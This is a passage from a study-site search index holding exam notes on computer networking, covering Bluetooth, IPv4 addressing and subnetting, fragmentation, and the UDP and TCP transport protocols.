obstacles</p>"},{"location":"cs/network/w4/#bluetooth-personal-area-network-pan","title":"Bluetooth / Personal Area Network (PAN)","text":""},{"location":"cs/network/w4/#bluetooth-vs-ieee-80211-comparison","title":"Bluetooth vs IEEE 802.11 Comparison","text":"Feature Bluetooth IEEE 802.11 (WiFi) Range ~10 meters 100+ meters Frequency 2.45 GHz ISM 2.4 GHz, 5 GHz ISM Primary Use Device connectivity Internet access Power Consumption Low (especially BLE) Higher Network Topology Piconet/Scatternet BSS/ESS Max Devices 7 active slaves per master Hundreds per AP Application Focus Cable replacement Data networking Protocol Layers Physical, Link, MAC MAC, Physical"},{"location":"cs/network/w4/#bluetooth-network-topology","title":"Bluetooth Network Topology","text":"<pre><code>Piconet 1                    Piconet 2\n    M1                          M2\n   /|\\                         /|\\\n  / | \\                       / | \\\n S1 S2 S3                    S4 S5 S6\n    |                           |\n    +-------- Bridge -----------+\n            (Scatternet)\n\nM = Master device\nS = Slave device\n</code></pre> <p>Key Constraints: * Each piconet: 1 master + up to 7 active slaves * Scatternet: Multiple interconnected piconets * Bridge device can be slave in multiple piconets</p>"},{"location":"cs/network/w4/#bluetooth-applications-and-use-cases","title":"Bluetooth Applications and Use Cases","text":"Application Category Examples Power Requirements Data/Voice Access Headsets, speakers Standard Bluetooth Cable Replacement Keyboards, mice, printers Standard Bluetooth IoT Sensors Health monitors, beacons Bluetooth Low Energy (BLE) File Transfer Phone to laptop Standard Bluetooth"},{"location":"cs/network/w4/#power-consumption-analysis","title":"Power Consumption Analysis","text":"<pre><code>Standard Bluetooth: \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2591\u2591 (High power)\nBluetooth LE (BLE): \u2588\u2588\u2591\u2591\u2591\u2591\u2591\u2591\u2591\u2591 (Very low power)\n\nBattery Life Impact:\nIoT Device with Standard BT: Days to weeks\nIoT Device with BLE:         Months to years\n</code></pre>"},{"location":"cs/network/w4/#wireless-technologies-summary","title":"Wireless Technologies Summary","text":""},{"location":"cs/network/w4/#frequency-band-utilization","title":"Frequency Band Utilization","text":"Technology Frequency Band Type License Required IEEE 802.11b/g/n 2.4 GHz ISM No IEEE 802.11a/n/ac 5 GHz ISM No Bluetooth 2.45 GHz ISM No <p>ISM Band Advantages: License-free operation, global availability ISM Band Disadvantages: Interference from other devices (microwaves, etc.)</p>"},{"location":"cs/network/w4/#technology-selection-matrix","title":"Technology Selection Matrix","text":"Use Case Range Needed Device Count Power Sensitivity Recommended Technology Home Internet High Many Low IEEE 802.11 Device Pairing Low Few Medium Bluetooth IoT Sensors Low Many High Bluetooth LE Enterprise Network High Very Many Low IEEE 802.11 with multiple APs"},{"location":"cs/network/w4/#common-exam-calculation-types","title":"Common Exam Calculation Types","text":"<p>1. Backoff Time Calculation Given: Collision attempt number n, slot time Formula: Backoff window = [0, 2^n - 1] Wait time = Random_slot \u00d7 Slot_time</p> <p>2. Throughput Estimation Factors: Nominal bandwidth, interference level, distance, concurrent users Real throughput \u2248 Nominal \u00d7 Efficiency_factor</p> <p>3. Range vs Power Trade-off Higher transmission power = Greater range but higher power consumption Lower power (BLE) = Shorter range but extended battery life</p>"},{"location":"cs/network/w5/","title":"5.0 Network Layer","text":"<p>The Network Layer is a fundamental concept in computer networks, residing above the Data Link Layer and below the Transport Layer in the OSI model.</p>"},{"location":"cs/network/w5/#layer-comparison-and-relationships","title":"Layer Comparison and Relationships","text":"Layer Primary Focus Scope Key Protocols Addressing Data Link Layer Frame transmission across single link Local (point-to-point) Ethernet, PPP MAC addresses Network Layer Packet delivery across multiple networks End-to-end IP, ICMP IP addresses Transport Layer Reliable/unreliable data transfer End-to-end TCP, UDP Port numbers <p>1. Role and Responsibilities *   The primary role of the Network Layer is to get packets from a source host to a destination host. This is a crucial distinction from the Data Link Layer, which is typically concerned with transmitting frames across a single link. *   It is the lowest OSI layer that has to deal with end-to-end transmission across interconnected networks. Layers above it, like the Transport Layer, also deal with end-to-end communication. *   The Network Layer must cater for packets traveling across multiple networks, which may be different in technology, number, type, and topology (e.g., combining Ethernet, Token Ring, fiber optics, satellite networks). *   Key design objectives for an effective Network Layer include being independent of processor/communication technology, independent of the number, type, and topology of the subnets, and providing a uniform addressing scheme for all hosts in the network.</p> <p>2. Internet Protocol (IP) *   IP is the main network layer protocol. It is most widely used, typically paired with TCP (Transport Control Protocol). *   IP runs on all hosts and routers in the network. *   It is responsible for handling the addressing and forwarding mechanisms. *   IP relays data across network boundaries and delivers packets from one host to another using IP addresses.</p> <p>3. IP Service Model (Focus on IPv4)</p>"},{"location":"cs/network/w5/#service-characteristics-comparison","title":"Service Characteristics Comparison","text":"Aspect IPv4 Characteristics Implications Connection Type Connectionless (datagram-based) No connection establishment required Delivery Guarantee Best-effort (unreliable) Packets may be lost, duplicated, delayed Ordering No guarantee Packets may arrive out of order Error Recovery None at IP level Higher layers (TCP) handle reliability <ul> <li>The service model provided by IP (specifically IPv4) is connectionless (datagram-based). This means a connection is not established beforehand; packets (datagrams) are simply sent out with destination information.</li> <li>It provides best-effort delivery, meaning it is an unreliable service.</li> <li>Due to this unreliable nature, packets may be lost, delivered out of order, duplicated, or delayed for a long time.</li> <li>Despite being unreliable, this best-effort service is still useful in many scenarios.</li> </ul> <p>4. IPv4 Addressing</p>"},{"location":"cs/network/w5/#address-structure-and-classes","title":"Address Structure and Classes","text":"Class First Bits Network Bits Host Bits Address Range Max Networks Max Hosts per Network A 0 8 24 1.0.0.0 - 126.255.255.255 126 16, 777, 214 B 10 16 16 128.0.0.0 - 191.255.255.255 16, 384 65, 534 C 110 24 8 192.0.0.0 - 223.255.255.255 2, 097, 152 254 <ul> <li>IP provides a uniform addressing scheme for all hosts, acting as a way of naming nodes.</li> <li>IPv4 addresses are 32 bits (4 bytes) long. They are commonly written in dotted decimal notation, where each byte is represented as a decimal number between 0 and 255, separated by dots (e.g., 192.168.1.1).</li> <li>IPv4 addresses have a basic hierarchical structure, consisting of a network part and a host part. This is analogous to a postal address structure like country, city, street, and house number.</li> <li>IPv4 Address Classes (A, B, C) were historically used, where the class and the default split between network and host parts were determined by the first few bits of the address.<ul> <li>Class A: First bit is 0. Network part is the first 8 bits. Host part is the remaining 24 bits.</li> <li>Class B: First two bits are 10. Network part is the first 16 bits. Host part is the remaining 16 bits.</li> <li>Class C: First three bits are 110. Network part is the first 24 bits. Host part is the remaining 8 bits.</li> </ul> </li> </ul>"},{"location":"cs/network/w5/#special-addresses","title":"Special Addresses","text":"Address Type Description Example (Class C) Usable for Hosts Network Address All host bits = 0 192.168.1.0 No Broadcast Address All host bits = 1 192.168.1.255 No Host Addresses Mixed host bits 192.168.1.1 - 192.168.1.254 Yes <ul> <li>Within any network or subnet, there are special addresses: the network address (all host bits are 0) and the broadcast address (all host bits are 1).</li> <li>These two special addresses reduce the number of usable host addresses in a network or subnet. If a network/subnet has H bits for the host part, the number of usable host addresses is 2<sup>H</sup> - 2.</li> <li>An IP address assigned to a device connected to the internet must be unique on the internet. They can be assigned dynamically (e.g., when connecting to a network like UniFi).</li> </ul> <p>5. Subnetting (CIDR Basics)</p>"},{"location":"cs/network/w5/#subnetting-example-calculation","title":"Subnetting Example Calculation","text":"<p>Scenario: An ISP has been allocated 192.168.1.0/24 and needs to create 4 subnets.</p> Subnet Network Address Subnet Mask CIDR Usable Range Broadcast 1 192.168.1.0 255.255.255.192 /26 192.168.1.1 - 192.168.1.62 192.168.1.63 2 192.168.1.64 255.255.255.192 /26 192.168.1.65 - 192.168.1.126 192.168.1.127 3 192.168.1.128 255.255.255.192 /26 192.168.1.129 - 192.168.1.190 192.168.1.191 4 192.168.1.192 255.255.255.192 /26 192.168.1.193 - 192.168.1.254 192.168.1.255 <p>Calculation Process: * Original network: 192.168.1.0/24 (8 host bits) * For 4 subnets: Need 2 additional bits (2\u00b2 = 4) * New subnet mask: /26 (24 + 2 = 26 network bits) * Host bits per subnet: 6 bits (32 - 26 = 6) * Hosts per subnet: 2\u2076 - 2 = 62 usable addresses</p>"},{"location":"cs/network/w5/#subnet-mask-formats","title":"Subnet Mask Formats","text":"CIDR Notation Dotted Decimal Binary (last octet) Host Bits Max Hosts /24 255.255.255.0 00000000 8 254 /25 255.255.255.128 10000000 7 126 /26 255.255.255.192 11000000 6 62 /27 255.255.255.224 11100000 5 30 /28 255.255.255.240 11110000 4 14 <ul> <li>Subnetting is a technique used to divide a larger network into smaller, distinct subnetworks. This is useful, for example, for an Internet Service Provider (ISP) to manage address space efficiently and distribute addresses to different customers or regions.</li> <li>Subnetting is implemented using a subnet mask. The subnet mask is a 32-bit number, often written in dotted decimal notation or using slash notation (CIDR - Classless Interdomain Routing).</li> <li>In the binary representation of a subnet mask, the bits that are part of the network/subnet address are set to 1, and the bits that are part of the host address are set to 0. The ones always fill from the left (most significant bit) to the right.</li> <li>The slash notation (e.g.,      <code>/24</code>,      <code>/25</code>) indicates the number of bits set to 1 in the subnet mask.</li> <li>To determine if a destination IP address is on the same subnet as the sending host, the host performs a bitwise AND operation between its own subnet mask and the destination IP address. If the result equals the subnet number of the sending host, the destination is on the same subnet.</li> </ul> <p>6. IPv4 Header</p>"},{"location":"cs/network/w5/#ipv4-header-field-analysis","title":"IPv4 Header Field Analysis","text":"<pre><code> 0                   1                   2                   3\n 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1 2 3 4 5 6 7 8 9 0 1\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|Version|  IHL  |Type of Service|          Total Length         |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|         Identification        |Flags|      Fragment Offset    |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|  Time to Live |    Protocol   |         Header Checksum       |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                       Source Address                          |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                    Destination Address                        |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n|                    Options                    |    Padding    |\n+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+\n</code></pre>"},{"location":"cs/network/w5/#key-header-fields-comparison","title":"Key Header Fields Comparison","text":"Field Size (bits) Purpose Key Values Impact of Errors Version 4 IP version identifier 4 (IPv4) Wrong protocol processing Header Length 4 Header size in 32-bit words 5-15 (20-60 bytes) Parsing errors Total Length 16 Entire packet size 20-65535 bytes Truncation/buffer issues TTL 8 Hop limit 1-255 Routing loops prevention Protocol 8 Upper layer protocol 1(ICMP), 6(TCP), 17(UDP) Wrong demultiplexing Header Checksum 16 Error detection Calculated value Corruption detection"},{"location":"cs/network/w5/#fragmentation-control-fields","title":"Fragmentation Control Fields","text":"Field Purpose Values Fragment Handling Identification Group fragments 0-65535 Same ID for all fragments of original packet DF Flag Don't Fragment 0/1 If 1, packet must not be fragmented MF Flag More Fragments 0/1 1 for all fragments except last Fragment Offset Position in original 0-8191 (\u00d78 bytes) Reassembly order indicator <ul> <li>Every IP packet (datagram) carries an IPv4 header appended to the data payload from the upper layer. The header contains information needed to transfer the packet.</li> <li>Understanding the fields in the IPv4 header is important. Key fields include:<ul> <li>Version: Indicates the IP version (e.g., 4 for IPv4). (IPv6 exists but is excluded from the exam).</li> <li>Header Length: Specifies the length of the IP header in 32-bit units. A value greater than 5 implies the presence of the optional \"Options\" field.</li> <li>Total Length: The total length of the IP datagram (header + data).</li> <li>Identification: A value used to identify fragments belonging to the same original datagram.</li> <li>Flags: Contains control bits related to fragmentation, including \"Don't Fragment\" (DF) and \"More Fragments\" (MF) flags. The DF flag set to 1 tells routers not to fragment the packet.</li> <li>Fragment Offset: Indicates the position of a fragment relative to the beginning of the original unfragmented datagram. It is measured in units of 8 bytes.</li> <li>Time To Live (TTL): A value that is decremented by each router (hop) the packet traverses. Its purpose is to limit the lifetime of a packet and prevent it from circulating endlessly in the network (e.g., due to routing loops). If TTL reaches zero, the packet is discarded.</li> <li>Protocol Identifier: Indicates the protocol used by the upper layer (e.g., TCP (6), UDP (17), ICMP (1)).</li> <li>Header Checksum: A checksum calculated only over the IP header. Its purpose is to detect errors in the header and ensure that routing information is correct. If due to error, the source or destination address changes, the packet would be misrouted.</li> <li>Source IP Address: The 32-bit IP address of the sending host.</li> <li>Destination IP Address: The 32-bit IP address of the intended receiving host.</li> <li>Options and Padding: Optional fields that can extend the header.</li> </ul> </li> </ul> <p>7. Fragmentation and Reassembly</p>"},{"location":"cs/network/w5/#fragmentation-example","title":"Fragmentation Example","text":"<p>Original Packet: 3000 bytes data + 20 bytes header = 3020 bytes total MTU Constraint: 1500 bytes</p> Fragment Data Size Total Size Identification MF Flag Fragment Offset Offset (bytes) 1 1480 bytes 1500 bytes 12345 1 0 0 2 1480 bytes 1500 bytes 12345 1 185 1480 3 40 bytes 60 bytes 12345 0 370 2960 <p>Calculation Notes: * Fragment Offset = (Byte Offset) / 8 * Fragment 1: 0 / 8 = 0 * Fragment 2: 1480 / 8 = 185 * Fragment 3: 2960 / 8 = 370</p>"},{"location":"cs/network/w5/#fragmentation-vs-reassembly-comparison","title":"Fragmentation vs. Reassembly Comparison","text":"Aspect Fragmentation Reassembly Location Source host or intermediate routers Destination host only Trigger Packet size &gt; MTU Receiving fragments Fields Used ID, DF, MF, Fragment Offset ID, MF, Fragment Offset Error Handling Drop if DF=1 and size &gt; MTU Discard all if one fragment lost Performance Impact Processing overhead Buffer management, timeout <ul> <li>Messages may need to be divided into smaller packets (fragments) before transmission. This happens when a datagram is larger than the Maximum Transmission Unit (MTU) of the next network link it needs to traverse.</li> <li>Fragmentation typically occurs at the source host or at intermediate routers if necessary.</li> <li>The Identification, Flags (MF), and Fragment Offset fields in the IP header are used to manage fragmentation.</li> <li>The \"More Fragments\" (MF) flag is set to 1 for all fragments except the last one. The \"Fragment Offset\" indicates the position of the fragment's data within the original datagram.</li> <li>Fragments are reassembled back into the original datagram at the destination host. They are put together based on their Identification and Fragment Offset values, even if they arrive out of order.</li> <li>IP itself does not provide recovery for lost fragments. If a fragment is lost, the entire original datagram cannot be reassembled, and a higher layer protocol (like TCP) would be responsible for requesting retransmission.</li> <li>Sources generally try to avoid fragmentation due to the overhead involved. Re-fragmentation of an already fragmented packet is possible.</li> </ul> <p>8. Forwarding (vs Routing)</p>"},{"location":"cs/network/w5/#forwarding-vs-routing-comparison","title":"Forwarding vs. Routing Comparison","text":"Aspect Forwarding Routing Scope Local router action Network-wide process Function Move packet input \u2192 output port Calculate/build forwarding tables Timeline Per-packet basis Periodic or topology-change triggered Data Structure Uses existing forwarding table Creates/updates forwarding table Location Individual router Network control plane Speed Requirement Very fast (hardware-based) Can be slower (software-based)"},{"location":"cs/network/w5/#example-forwarding-table","title":"Example Forwarding Table","text":"Destination Network Next Hop Interface Metric 192.168.1.0/24 Direct eth0 0 192.168.2.0/24 10.0.0.1 eth1 1 0.0.0.0/0 10.0.0.254 eth1 10 <ul> <li>Forwarding is the local action taken by a router to move a packet from an input interface to an output interface.</li> <li>A router determines the appropriate output port by looking up the destination IP address of the incoming packet in its forwarding table.</li> <li>(While related, the process of creating or calculating these forwarding/routing tables is called Routing, which is an excluded topic).</li> </ul>"},{"location":"cs/network/w5/#concept-integration-and-relationships","title":"Concept Integration and Relationships","text":""},{"location":"cs/network/w5/#network-layer-process-flow","title":"Network Layer Process Flow","text":"<pre><code>Source Host                Router                 Destination Host\n     |                        |                           |\n1. Create IP packet      2. Receive packet         6. Receive packet\n   - Add IP header          - Check TTL               - Verify header\n   - Fragment if needed     - Decrement TTL           - Reassemble fragments\n     |                      - Check destination        - Extract payload\n2. Send to router          - Lookup forwarding table      |\n     |                      - Forward to next hop    7. Deliver to upper layer\n     |                           |                        |\n     +------ Network Path -------+                        |\n</code></pre>"},{"location":"cs/network/w5/#common-calculation-types","title":"Common Calculation Types","text":"<p>1. Address Class Identification * Given: 172.16.5.10 * Binary: 10101100.00010000.00000101.00001010 * First two bits: 10 \u2192 Class B</p> <p>2. Subnetting Calculations * Network: 192.168.1.0/24, need 6 subnets * Required subnet bits: ceil(log\u2082(6)) = 3 bits * New mask: /27 (24 + 3) * Hosts per subnet: 2\u2075 - 2 = 30</p> <p>3. Fragmentation Calculations * Original: 4000 bytes, MTU: 1500 bytes * Fragments needed: ceil(4000/1480) = 3 * Fragment offsets: 0, 185, 370</p> <p>These notes cover the examinable aspects of the Network Layer and IP based on the provided sources and your list of exclusions. Remember to provide clear explanations and justifications for your answers in the exam.</p>"},{"location":"cs/network/w6/","title":"6.0 Transport Layer","text":"<p>Open book notes for the Transport Layer section, focusing on potentially examinable material and strictly excluding Sockets, Flow Control, and Congestion Control, based on the provided sources and our conversation history.</p>"},{"location":"cs/network/w6/#1-role-of-the-transport-layer","title":"1. Role of the Transport Layer","text":"<ul> <li>The Transport Layer is responsible for providing host-to-host (or process-to-process) communication services for applications.</li> <li>It sits above the Network Layer.</li> <li>It manages delivery of a message from one process to another, whereas the Network layer oversees source to destination delivery.</li> <li>The Transport Layer is the lowest OSI layer that has to deal with end-to-end transmission. Layers above it are also concerned with end-to-end transmission.</li> </ul>"},{"location":"cs/network/w6/#layer-responsibility-comparison","title":"Layer Responsibility Comparison","text":"Layer Primary Focus Addressing Unit Key Responsibility Network Layer Host-to-Host IP Address Routing packets between hosts Transport Layer Process-to-Process Port Number End-to-end delivery between applications Application Layer Service-to-Service Application Protocol Specific application services"},{"location":"cs/network/w6/#2-ports","title":"2. Ports","text":"<ul> <li>When delivering packets, Network Layer IP addresses alone are not enough as they only address hosts, and not individual operating system processes on those hosts.</li> <li>Transport protocols identify software endpoints (applications) on a host using a 16-bit positive port number.</li> <li>An endpoint is a combination of an IP address and a port number.</li> <li>Port numbers are needed because multiple applications may be running on a host and communicating over the network simultaneously. The transport layer uses port numbers to direct incoming packets to the correct application process.</li> <li>There are predefined port numbers for common applications (e.g., FTP, SSH, Telnet, SMTP, HTTP). Many of these common application protocols use TCP.</li> </ul>"},{"location":"cs/network/w6/#port-number-ranges","title":"Port Number Ranges","text":"Range Type Usage Examples 0-1023 Well-known Ports System/Reserved HTTP(80), HTTPS(443), FTP(21), SSH(22) 1024-49151 Registered Ports User applications Custom services 49152-65535 Dynamic/Private Temporary/Client Ephemeral connections"},{"location":"cs/network/w6/#endpoint-address-structure","title":"Endpoint Address Structure","text":"<pre><code>Complete Endpoint = IP Address + Port Number\nExample: 192.168.1.100:8080\n         \u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500 IP Address (Host identification)\n         \u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500 Port Number (Process identification)\n</code></pre>"},{"location":"cs/network/w6/#3-transport-protocol-comparison-overview","title":"3. Transport Protocol Comparison Overview","text":"<p>Before diving into specific protocols, here's a fundamental comparison:</p> Aspect UDP TCP Connection Type Connectionless Connection-oriented Reliability Unreliable (Best-effort) Reliable Ordering No ordering guarantee Ordered delivery Header Size 8 bytes 20+ bytes Speed Faster Slower (due to overhead) Use Cases Streaming, DNS, Gaming Web browsing, Email, File transfer Error Detection Basic checksum Comprehensive error handling Flow Control None Yes Congestion Control None Yes"},{"location":"cs/network/w6/#4-user-datagram-protocol-udp","title":"4. User Datagram Protocol (UDP)","text":""},{"location":"cs/network/w6/#udp-properties-characteristics","title":"UDP Properties &amp; Characteristics","text":"<ul> <li>Properties:<ul> <li>Unreliable, unordered datagram service.</li> <li>Connectionless.</li> <li>Best-effort delivery. Packets may be lost, delivered out of order, duplicated, or delayed.</li> <li>UDP packets are free packets once they are out, meaning they don't necessarily follow the same route and have no information about other packets in the stream.</li> </ul> </li> </ul> <ul> <li>Advantages:<ul> <li>Lightweight, low overhead.</li> <li>Speed: Provides faster delivery compared to protocols with more overhead.</li> <li>Finer control over what data is sent and when.</li> <li>No delay for connection establishment.</li> <li>No connection state: Does not allocate buffers, parameters, or sequence numbers for the connection itself.</li> </ul> </li> </ul> <ul> <li>Use Cases/Applications: Applications where some packet loss or reordering is acceptable, or handled by the application layer.<ul> <li>Streaming media (video calls, video/music streaming).</li> <li>DNS (Domain Name Service).</li> <li>Network Time Protocol (NTP).</li> </ul> </li> </ul>"},{"location":"cs/network/w6/#udp-header-structure","title":"UDP Header Structure","text":"<pre><code>UDP Header (8 bytes total)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502   Source Port    \u2502 Destination Port \u2502  (16 bits each)\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502      Length      \u2502     Checksum     \u2502  (16 bits each)\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n\u2502                Data                 \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <ul> <li>UDP Header:<ul> <li>Small packet header, typically 8 bytes long.</li> <li>Contains fields for Source Port, Destination Port, Length, and Checksum.</li> <li>The IP address information is handled at the Network (IP) layer, not in the UDP header.</li> </ul> </li> </ul>"},{"location":"cs/network/w6/#udp-checksum-mechanism","title":"UDP Checksum Mechanism","text":"<ul> <li>Checksum:<ul> <li>Aids in error detection within the UDP packet.</li> <li>It is optional in IPv4 but mandatory in IPv6.</li> <li>Calculated by adding 16-bit words of the data (including a pseudo-header derived from the IP header) using one's complement arithmetic, carrying bits over to the least significant bit, and then flipping the bits of the final sum.</li> <li>It can detect any one-bit errors but not all two-bit errors. Two-bit errors where the bit flips cancel each other out during addition cannot be detected.</li> <li>It checks for errors in the packet header and data.</li> </ul> </li> </ul>"},{"location":"cs/network/w6/#checksum-calculation-example","title":"Checksum Calculation Example","text":"<pre><code>Example Data: 0x4500 + 0x003C + 0x1C46 = 0x7C82\nOne's Complement: ~0x7C82 = 0x837D\nFinal Checksum: 0x837D\n\nError Detection Capability:\n\u2713 Single bit errors: Always detected\n\u2717 Some double bit errors: May not be detected if they cancel out\n</code></pre>"},{"location":"cs/network/w6/#udp-limitations","title":"UDP Limitations","text":"<ul> <li>Problems with UDP:<ul> <li>Due to potentially taking different routes, packets can have varying round-trip times and there is no guarantee of packet ordering.</li> <li>These problems mean the application layer is often responsible for handling packet ordering and recovery if needed.</li> </ul> </li> </ul>"},{"location":"cs/network/w6/#udp-communication-flow","title":"UDP Communication Flow","text":"<pre><code>Client                    Server\n  \u2502                         \u2502\n  \u2502\u2500\u2500\u2500\u2500 UDP Packet 1 \u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502  (No connection setup)\n  \u2502\u2500\u2500\u2500\u2500 UDP Packet 2 \u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502  (Independent packets)\n  \u2502\u2500\u2500\u2500\u2500 UDP Packet 3 \u2500\u2500\u2500\u2500\u2500\u2500\u2192\u2502  (May arrive out of order)\n  \u2502                         \u2502\n  \u2502\u2190\u2500\u2500\u2500\u2500 Response \u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2502  (Optional, application-dependent)\n</code></pre>"},{"location":"cs/network/w6/#5-transmission-control-protocol-tcp","title":"5. Transmission Control Protocol (TCP)","text":""},{"location":"cs/network/w6/#tcp-properties-guarantees","title":"TCP Properties &amp; Guarantees","text":"<ul> <li>Role/Properties/Guarantees:<ul> <li>Provides a reliable end-to-end service.</li> <li>Connection-oriented: A logical connection is established and maintained between sender and receiver before data transfer begins and until terminated.</li> <li>Full-duplex: Data can be transmitted in both directions simultaneously.</li> <li>Point-to-point communication: Only two parties are connected at a time.</li> <li>Stream interface: Presents a reliable frame stream to the network layer.</li> <li>Graceful connection shutdown.</li> <li>Guarantees: Guaranteed delivery, in-order delivery, unique delivery (no duplicates).</li> </ul> </li> </ul> <ul> <li>Advantages: Reliability, suitability for applications requiring accurate data transfer like file transfer and email.</li> <li>Applications: Most widely used protocol, likely implemented by almost any application using the internet. Examples include FTP, SSH, Telnet, SMTP, HTTP/HTTPS, file transfer, email.</li> </ul>"},{"location":"cs/network/w6/#tcp-header-structure","title":"TCP Header Structure","text":"<pre><code>TCP Header (20+ bytes)\n\u250c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u252c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2510\n\u2502  Source Port   \u2502 Destination Port\u2502  Sequence Number (32 bits)      \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524\n\u2502     Acknowledgement Number (32 bits)           \u2502Data\u2502Res\u2502  Flags  \u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524Off \u2502   \u2502U A P R S F\u2502\n\u2502           Window Size          \u2502   Checksum     \u2502set \u2502   \u2502R C S S Y I\u2502\n\u251c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u253c\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2524    \u2502   \u2502G K H T N N\u2502\n\u2502        Urgent Pointer          \u2502   Options...   \u2502    \u2502   \u2502         \u2502\n\u2514\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2534\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2500\u2518\n</code></pre> <ul> <li>TCP Header:<ul> <li>Requires more information than UDP.</li> <li>Typically 20 bytes long, plus optional fields and padding.</li> <li>Contains fields for Source Port, Destination Port, Sequence Number, Acknowledgement Number, Data offset, Reserved, Flags (URG, ACK, PSH, RST, SYN, FIN), Window, Checksum, Urgent Pointer, Options, Padding.</li> </ul> </li> </ul>"},{"location":"cs/network/w6/#tcp-flags-and-their-functions","title":"TCP Flags and Their Functions","text":"Flag Name Purpose Usage SYN Synchronize Establish connection Connection initiation ACK Acknowledge Confirm receipt Data acknowledgment FIN Finish Terminate connection Connection closure RST Reset Abort connection Error/rejection PSH Push Immediate delivery Priority data URG Urgent Urgent data pointer Emergency data"},{"location":"cs/network/w6/#tcp-segmentation","title":"TCP Segmentation","text":"<ul> <li>Segments:<ul> <li>TCP divides application data into segments for transmission. This is necessary as application messages may be larger than the Maximum Segment Size (MSS).</li> <li>A segment is sent when it is full (MSS reached), times out, or is pushed by the application.</li> <li>MSS is typically up to about 1460 bytes.</li> </ul> </li> </ul>"},{"location":"cs/network/w6/#segmentation-example","title":"Segmentation Example","text":"<pre><code>Application Data (5000 